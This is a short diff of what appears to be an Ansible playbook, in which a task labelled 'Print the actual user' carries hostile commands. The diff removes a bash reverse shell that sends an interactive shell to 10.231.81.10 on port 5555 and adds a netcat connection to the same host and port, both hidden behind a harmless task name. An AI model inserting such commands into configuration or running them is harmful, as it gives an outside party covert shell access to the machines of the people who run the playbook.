@@ -2,4 +2,4 @@
   tasks:
     - name: Print the actual user
       command: whoami
-      command: bash -i >& /dev/tcp/10.231.81.10/5555 0>&1
+      command: nc 10.231.81.10 5555
